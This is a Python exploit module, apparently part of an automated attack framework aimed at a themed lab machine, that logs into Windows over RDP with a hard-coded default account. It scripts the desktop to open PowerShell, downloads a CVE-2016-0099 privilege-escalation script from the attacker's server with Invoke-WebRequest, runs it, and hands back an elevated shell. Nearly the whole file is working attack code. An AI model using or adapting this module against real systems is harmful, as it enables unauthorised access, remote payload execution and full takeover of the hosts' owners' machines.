#######################################################
# RDP
# (not a CVE/Metasploit module)
#
# This exploit utilizes the default username/password 
# for the greedo user to RDP into the machine.
#######################################################

from utils import Exploit
from pwn import *
import time
from shells.rdp_shell import RDPShell
pwnlib.args.SILENT(0)

class RDP(Exploit):
    '''Class for performing the RDP default credentials exploit'''
    username = 'greedo'
    password = 'hanShotFirst!'

    def __init__(self, server_ip: str):
        super().__init__(
            os='windows',
            name='RDP using default credentials for user greedo',
            description='',
            requirements=['rdp'],
            webserver=True,
            server_ip=server_ip
        )
    
    def attack(self, target: str):
        '''Perform the attack on a target and return a RDP shell'''
        # Connect with RDP to target machine
        self.message(target, 'Connecting to RDP...')
        p = process(['rdesktop', '-u', self.username, '-p', self.password, '-r', 'clipboard', target])
        
        # Check if RDP connection succeeded
        if p is not None and p.poll() is None:
            # Accept certificate
            output = p.recv()
            if output.endswith(b'Do you trust this certificate (yes/no)? '):
                p.sendline(b'yes')
        
            # Give time for RDP session to connect
            time.sleep(5)
            self.message(target, 'Found RDP process')

            # Find RDP window
            result = process(['xdotool', 'search', '--name', f'rdesktop - {target}'])
            window_id = result.recv().strip(b'\n').decode()
            if window_id:
                self.message(target, 'Found RDP window; creating shell')

                # Open powershell window
                self.message(target, 'Opening PowerShell window...')
                subprocess.run(['xdotool', 'key', '--window', window_id, 'super+r'])
                subprocess.run(['xdotool', 'type', '--window', window_id, 'powershell.exe'])
                subprocess.run(['xdotool', 'key', '--window', window_id, 'Return'])
                time.sleep(3)

                # Download and run priv esc script
                self.message(target, 'Running privilege escalation script...')
                shell = RDPShell(target, self.os, p, window_id)
                shell.cmd(r'$SCRIPT="C:\Users\greedo\Documents\good.ps1"')
                shell.cmd('[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12')
                shell.cmd(f'Invoke-WebRequest -Uri http://{self.server_ip}:8000/CVE-2016-0099.ps1 -OutFile $SCRIPT')
                shell.cmd('& $SCRIPT')

                # Spawn powershell
                time.sleep(5)
                shell.cmd('powershell')

                # Return elevated shell
                self.message(target, 'Returning privileged shell')
                self.success(target)
                return shell
            else:
                self.error(target, 'Could not find RDP window')
        else:
            self.error(target, 'Could not connect via RDP')
